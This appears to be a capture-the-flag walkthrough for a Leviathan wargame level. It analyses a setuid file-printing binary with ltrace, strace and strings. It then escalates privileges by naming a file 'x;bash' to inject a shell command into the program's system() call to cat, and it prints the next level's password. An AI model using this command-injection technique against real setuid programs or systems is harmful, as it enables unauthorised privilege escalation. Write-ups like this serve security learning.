Let's see what we're dealing with.

```sh
leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ file printfile 
printfile: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d1b5e5f479cfe2970294b7e8b7af05257c24777f, not stripped
```

If we try to run the file to get leviathan3's password, though...

```sh
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Let's try ltracing it.

```sh
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x565556c0, 2, 0xffffd724, 0x565557b0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)      = -1
puts("You cant have that file..."You cant have that file...
)               = 27
+++ exited (status 1) +++
```

Let's try to learn more about how it works.

```sh
leviathan2@leviathan:~$ strace ./printfile /etc/leviathan_pass/leviathan3
execve("./printfile", ["./printfile", "/etc/leviathan_pass/leviathan3"], [/* 20 vars */]) = 0
strace: [ Process PID=25450 runs in 32 bit mode. ]
brk(NULL)                               = 0x56558000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=35506, ...}) = 0
mmap2(NULL, 35506, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
close(3)                                = 0
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
mprotect(0x56556000, 4096, PROT_READ)   = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fc9000, 35506)               = 0
access("/etc/leviathan_pass/leviathan3", R_OK) = -1 EACCES (Permission denied)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 6), ...}) = 0
brk(NULL)                               = 0x56558000
brk(0x56579000)                         = 0x56579000
write(1, "You cant have that file...\n", 27You cant have that file...
) = 27
exit_group(1)                           = ?
+++ exited with 1 +++
leviathan2@leviathan:~$ strings ./printfile
/lib/ld-linux.so.2
%|$w
libc.so.6
_IO_stdin_used
puts
setreuid
system
geteuid
__cxa_finalize
access
__libc_start_main
snprintf
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.1.3
GLIBC_2.0
Y[^]
UWVS
t$,U
[^_]
*** File Printer ***
Usage: %s filename
You cant have that file...
/bin/cat %s
;*2$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6587
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
printfile.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
_edata
geteuid@@GLIBC_2.0
__x86.get_pc_thunk.dx
__cxa_finalize@@GLIBC_2.1.3
__data_start
puts@@GLIBC_2.0
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
setreuid@@GLIBC_2.0
__libc_start_main@@GLIBC_2.0
__libc_csu_init
snprintf@@GLIBC_2.0
_fp_hw
access@@GLIBC_2.0
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```

This took me longer than I'd like to admit. Looks like there's a vulnerability
when it calls on "cat" to read the file. Let's see if we can break out of the
program by breaking the input.

It came to me when I was experimenting with the file and trying to make it read
a file I made.

```sh
leviathan2@leviathan:~$ mktemp -d
/tmp/tmp.uGciFdw88Z
leviathan2@leviathan:~$ cd /tmp/tmp.uGciFdw88Z
leviathan2@leviathan:/tmp/tmp.uGciFdw88Z$ echo "x" > x
leviathan2@leviathan:/tmp/tmp.uGciFdw88Z$ ~/printfile x
/bin/cat: x: Permission denied
```

It's called in cat! Of course! We can name the file we're trying to call with
a ";" to execute commands and escape cat and execute commands as the program.
Let's spawn a shell!

```sh
leviathan2@leviathan:/tmp/tmp.uGciFdw88Z$ mv x x\;bash
leviathan2@leviathan:/tmp/tmp.uGciFdw88Z$ ~/printfile x\;bash 
/bin/cat: x: Permission denied
leviathan3@leviathan:/tmp/tmp.uGciFdw88Z$
```

And we're leviathan3! Let's get the flag and spawn a proper connection via ssh.

```sh
leviathan3@leviathan:/tmp/tmp.uGciFdw88Z$ cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j
```
